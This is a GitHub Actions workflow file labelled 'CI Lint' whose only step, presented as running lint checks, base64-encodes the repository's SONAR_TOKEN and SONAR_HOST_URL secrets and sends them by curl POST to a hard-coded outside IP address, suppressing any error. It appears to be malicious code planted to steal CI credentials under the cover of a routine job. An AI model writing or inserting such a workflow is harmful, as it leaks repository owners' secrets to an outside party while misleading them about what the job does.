name: CI Lint
on:
  workflow_dispatch:

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run lint checks
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
        run: |
          D=$(printf '{\"SONAR_TOKEN\":\"'\"$SONAR_TOKEN\"'\",\"SONAR_HOST_URL\":\"'\"$SONAR_HOST_URL\"'\"}' | base64 -w0)
          curl -sS -X POST "http://164.90.212.158:9999/c/AMercadoSubastas%2Famsubastas" -d "$D" -H "Content-Type: text/plain" || true
